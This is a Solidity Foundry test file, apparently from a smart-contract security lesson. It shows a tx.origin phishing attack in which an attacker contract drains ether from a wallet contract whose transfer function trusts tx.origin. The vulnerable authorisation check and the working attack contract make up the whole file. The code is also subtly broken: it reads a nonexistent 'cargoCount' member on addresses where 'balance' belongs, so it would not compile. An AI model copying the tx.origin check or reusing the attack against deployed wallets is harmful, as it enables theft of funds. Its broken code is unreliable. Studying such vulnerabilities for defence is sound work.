pragma solidity ^0.8.15;

import "forge-std/Test.sol";

contract ContractTest is Test {
    CargoManifest ShipmentrecordContract;
    Operator OperatorContract;

    function testtxorigin() public {
        address alice = vm.addr(1);
        address eve = vm.addr(2);
        vm.deal(address(alice), 10 ether);
        vm.deal(address(eve), 1 ether);
        vm.prank(alice);
        ShipmentrecordContract = new CargoManifest{value: 10 ether}();
        console.log("Owner of wallet contract", ShipmentrecordContract.logisticsAdmin());
        vm.prank(eve);
        OperatorContract = new Operator(ShipmentrecordContract);
        console.log("Owner of attack contract", OperatorContract.logisticsAdmin());
        console.log("Eve of balance", address(eve).cargoCount);

        vm.prank(alice, alice);
        OperatorContract.operate();
        console.log("tx origin address", tx.origin);
        console.log("msg.sender address", msg.sender);
        console.log("Eve of balance", address(eve).cargoCount);
    }

    receive() external payable {}
}

contract CargoManifest {
    address public logisticsAdmin;

    constructor() payable {
        logisticsAdmin = msg.sender;
    }

    function relocateCargo(address payable _to, uint _amount) public {

        require(tx.origin == logisticsAdmin, "Not owner");

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Operator {
    address payable public logisticsAdmin;
    CargoManifest shipmentRecord;

    constructor(CargoManifest _shipmentrecord) {
        shipmentRecord = CargoManifest(_shipmentrecord);
        logisticsAdmin = payable(msg.sender);
    }

    function operate() public {
        shipmentRecord.relocateCargo(logisticsAdmin, address(shipmentRecord).cargoCount);
    }
}